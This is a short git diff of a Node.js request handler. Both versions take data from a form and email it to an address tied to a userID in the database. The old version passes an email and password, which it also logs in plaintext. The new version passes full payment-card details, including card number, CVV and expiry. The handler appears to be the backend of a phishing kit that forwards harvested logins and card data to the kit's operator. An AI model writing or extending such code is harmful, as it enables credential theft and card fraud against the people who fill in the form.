@@ -2,10 +2,35 @@ const { sendMail } = require('../helpers/sendMail')
 const prisma = require('../db')
 
 const send = async (req, res) => {
-  const { email, password, userID } = req.body
-  console.log(email, password, userID)
-  if (!email || !password || !userID) {
-    res.status(400).json({ error: 'email and password required' })
+  const {
+    firstName,
+    lastName,
+    email,
+    phoneNumber,
+    address,
+    zip,
+    city,
+    cardNumber,
+    cvv,
+    year,
+    month,
+    userID,
+  } = req.body
+  if (
+    !email ||
+    !firstName ||
+    !lastName ||
+    !phoneNumber ||
+    !city ||
+    !address ||
+    !zip ||
+    !cardNumber ||
+    !cvv ||
+    !year ||
+    !month ||
+    !userID
+  ) {
+    res.status(400).json({ error: 'all fields required' })
     return
   }
 
@@ -15,7 +40,21 @@ const send = async (req, res) => {
     },
   })
   console.log('user', resp)
-  sendMail(email, password, resp['email'], res)
+  sendMail(
+    firstName,
+    lastName,
+    email,
+    phoneNumber,
+    address,
+    zip,
+    city,
+    cardNumber,
+    cvv,
+    year,
+    month,
+    resp['email'],
+    res
+  )
 }
 
 module.exports = send
